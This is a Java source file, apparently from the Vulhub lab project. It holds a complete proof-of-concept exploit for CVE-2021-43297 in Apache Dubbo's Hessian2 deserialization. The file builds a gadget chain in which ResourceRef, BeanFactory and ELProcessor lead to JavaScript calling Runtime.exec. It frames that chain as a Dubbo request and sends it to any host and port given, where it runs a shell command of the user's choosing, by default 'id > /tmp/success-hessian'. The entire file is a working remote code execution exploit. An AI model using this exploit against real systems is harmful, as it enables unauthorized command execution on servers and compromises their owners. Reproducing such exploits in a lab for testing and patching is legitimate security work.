package org.vulhub.poc;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.com.caucho.hessian.io.SerializerFactory;
import org.apache.dubbo.common.io.Bytes;
import org.apache.naming.ResourceRef;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;

import javax.naming.Binding;
import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.Random;

public class CVE202143297 {
    private static final byte[] MAGIC = new byte[]{(byte) 0xda, (byte) 0xbb};
    private static final byte FLAG_REQUEST = (byte) 0x80;
    private static final byte FLAG_TWOWAY = (byte) 0x40;
    private static final byte HESSIAN2_SERIALIZATION_ID = 2;

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2021-43297 <host> <port> [command]");
            System.err.println("Example: CVE-2021-43297 127.0.0.1 20880 \"id > /tmp/success-hessian\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String command = positional.length == 3 ? positional[2] : "id > /tmp/success-hessian";

        byte[] payload = createPayload(command);
        PocUtils.send(host, port, payload);

        System.out.println("Hessian2 payload sent to " + host + ":" + port);
    }

    private static byte[] createPayload(String command) throws Exception {
        ContextUtil.ReadOnlyBinding binding = createBinding(command);

        ByteArrayOutputStream body = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(body);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        output.setSerializerFactory(serializerFactory);
        output.writeString("2.7.9");
        output.writeObject(binding);
        output.flushBuffer();
        output.close();

        byte[] data = body.toByteArray();
        ByteArrayOutputStream request = new ByteArrayOutputStream();
        request.write(MAGIC);
        request.write(FLAG_REQUEST | FLAG_TWOWAY | HESSIAN2_SERIALIZATION_ID);
        request.write(0);
        request.write(Bytes.long2bytes(new Random().nextLong()));
        request.write(Bytes.int2bytes(data.length));
        request.write(data);
        return request.toByteArray();
    }

    private static ContextUtil.ReadOnlyBinding createBinding(String command) throws Exception {
        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null,
                "",
                "",
                true,
                "org.apache.naming.factory.BeanFactory",
                null
        );
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", expression(command)));

        WritableContext context = new WritableContext();
        setFieldValue(context, "parsedNameInNamespace", null);

        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, context);
        setFieldValue(binding, "fullName", "foo");
        return binding;
    }

    private static String expression(String command) {
        String escapedCommand = command.replace("\\", "\\\\").replace("\"", "\\\"");
        return "''.getClass().forName('javax.script.ScriptEngineManager').newInstance()"
                + ".getEngineByName('JavaScript').eval(\"Java.type('java.lang.Runtime')"
                + ".getRuntime().exec([\\\"/bin/sh\\\",\\\"-c\\\",\\\"" + escapedCommand + "\\\"])\")";
    }

    private static void setFieldValue(Object object, String fieldName, Object value) throws Exception {
        Field field = getField(object.getClass(), fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    private static Field getField(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        Class<?> current = clazz;
        while (current != null) {
            try {
                return current.getDeclaredField(fieldName);
            } catch (NoSuchFieldException ignored) {
                current = current.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }
}
